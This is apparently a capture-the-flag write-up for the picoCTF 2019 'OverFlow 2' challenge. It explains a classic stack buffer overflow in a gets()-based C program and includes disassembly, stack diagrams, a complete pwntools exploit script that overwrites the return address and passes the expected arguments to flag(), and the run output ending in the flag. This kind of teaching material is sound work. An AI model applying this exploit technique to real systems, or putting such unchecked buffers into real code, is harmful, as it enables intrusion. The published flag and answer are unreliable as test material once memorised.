# PicoCTF 2019 - OverFlow 2
Author: PinkNoize

Binary Exploitation - 250

> Now try overwriting arguments. Can you get the flag from this program? You can find it in /problems/overflow-2_4_bbfcc061b1e9e5e8a7e313593365d434 on the shell server.

## TL;DR

The challenge provides a program with a classic buffer overflow and a function to print the flag. To solve, overwrite a return address with the address of the flag function and set the expected function arguments.

# Writeup

This challenge is identical to [OverFlow 1](overflow1.md) except that it expects certain arguments to be passed to `flag()`. This challenge provides us with a flag file, a binary and the source code for that binary.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

Like Overflow 1, we have to change the return address of `vuln()` to `flag()`. We can get the offset from `buf` to the return address by viewing the assembly.

```gas
08048676 <vuln>:
8048676:       55                      push   ebp
8048677:       89 e5                   mov    ebp,esp
8048679:       53                      push   ebx
804867a:       81 ec b4 00 00 00       sub    esp,0xb4
8048680:       e8 9b fe ff ff          call   8048520 <__x86.get_pc_thunk.bx>
8048685:       81 c3 7b 19 00 00       add    ebx,0x197b
804868b:       83 ec 0c                sub    esp,0xc
804868e:       8d 85 48 ff ff ff       lea    eax,[ebp-0xb8]
8048694:       50                      push   eax
8048695:       e8 96 fd ff ff          call   8048430 <gets@plt>
804869a:       83 c4 10                add    esp,0x10
804869d:       83 ec 0c                sub    esp,0xc
80486a0:       8d 85 48 ff ff ff       lea    eax,[ebp-0xb8]
80486a6:       50                      push   eax
80486a7:       e8 b4 fd ff ff          call   8048460 <puts@plt>
80486ac:       83 c4 10                add    esp,0x10
80486af:       90                      nop
80486b0:       8b 5d fc                mov    ebx,DWORD PTR [ebp-0x4]
80486b3:       c9                      leave  
80486b4:       c3                      ret    
```
From the call to `gets()`, we can see that the only local variable, `buf`, is placed at ebp-0xb8. Knowing that ebp points at the previous base pointer, we can figure out that the return address is located at ebp+0x4. This means we have to write (ebp+0x4-(ebp-0xb8)) = 0xbc bytes to overwrite the return address.
```
High Addresses
                /-----------------------\
                | Previous Stack Frame  |
                \-----------------------/
                /-----------------------\
                |       Arguments       |
                |-----------------------|
                |     Return Address    |
    Current     |-----------------------|
    Stack       | Previous Base Pointer | <-- ebp
    Frame       |-----------------------|
                |  Backed up Registers  | 
                |-----------------------|
                |    Local Variables    | <-- esp
                \-----------------------/
Low Addresses
```

We will also have to pass arguments to flag if we want it to print the flag. As we are not calling a function but instead doing a return to the start of the function, we need to setup the stack so that after the return from `vuln()`, we will have half of the stack frame setup. Before the return from `vuln()`, our stack will have to look like this...

```
                /-----------------------\
                |          Arg2         |
                |-----------------------|
                |          Arg1         |
                |-----------------------|
                |  Dummy Return Address |
                |-----------------------|
                |     flag() Address    |
                |-----------------------|
                |          AAAA         | <-- ebp
                |-----------------------|
                |          AAAA         |
                |-----------------------|
                            .
                            .
                            .
                |          AAAA         | <-- esp
                \-----------------------/ 
```

I will be using [pwntools](https://github.com/Gallopsled/pwntools) to create the exploit for this one to show how a CTF framework can simplify some of the quirks of exploit writing. The script below requires you to [setup ssh keys](https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2) for the picoCTF shell server.

```python
from pwn import *
# arch or architecture is i386 as this is a 32 bit binary (you can check this with file)
# os or operating system is linux as the picoCTF shell is on a linux system 
context(arch='i386', os='linux')

# ssh into the shell server
s1 = ssh(
    host='2019shell1.picoctf.com',
    user='user',
    keyfile='~/.ssh/picoCTF',
)
s1.set_working_directory(b'/problems/overflow-2_4_bbfcc061b1e9e5e8a7e313593365d434')
# run vuln
p = s1.process('./vuln')
# parse the elf file
elf = p.elf

flag_addr = elf.symbols['flag']

# Receive the prompt
p.recvline()

# Pad up to the return address
payload = b"A"*(0xBC)

# add flag() address as a 32 bit value
# pwntools automatically makes it little endian as we specified the context above
payload += p32(flag_addr)

# Add dummy return
payload += p32(0xAAAAAAAA)

# Add arg1
payload += p32(0xDEADBEEF)

# Add arg2
payload += p32(0xC0DED00D)

# Send the payload
p.sendline(payload)

print(p.recvallS())
p.close()
```

We can then run this script to receive the flag. Make sure to substitute your username and path to keyfile.

```bash
┌─[user@hostname]─[~]
└──╼ $python3 solution.py 
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] user@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[*] Working directory: '/problems/overflow-2_4_bbfcc061b1e9e5e8a7e313593365d434'
[+] Starting remote process './vuln' on 2019shell1.picoctf.com: pid 1935868
[+] Opening new channel: 'readlink -f /problems/overflow-2_4_bbfcc061b1e9e5e8a7e313593365d434/vuln': Done
[+] Receiving all data: Done (61B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[+] Downloading '/lib32/libc.so.6' to '/home/user/2019shell1.picoctf.com/lib32/libc.so.6': Found '/lib32/libc-2.27.so' in ssh cache
[+] Downloading '/lib/ld-linux.so.2' to '/home/user/2019shell1.picoctf.com/lib/ld-linux.so.2': Found '/lib32/ld-2.27.so' in ssh cache
[+] Downloading '/problems/overflow-2_4_bbfcc061b1e9e5e8a7e313593365d434/vuln' to '/home/user/2019shell1.picoctf.com/problems/overflow-2_4_bbfcc061b1e9e5e8a7e313593365d434/vuln': Found '/problems/overflow-2_4_bbfcc061b1e9e5e8a7e313593365d434/vuln' in ssh cache
[*] '/home/user/2019shell1.picoctf.com/problems/overflow-2_4_bbfcc061b1e9e5e8a7e313593365d434/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Receiving all data: Done (238B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1935868)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAæ
\x04ªªªªï¾­ÞÐÞÀ
picoCTF{arg5_and_r3turn598632d70}
```
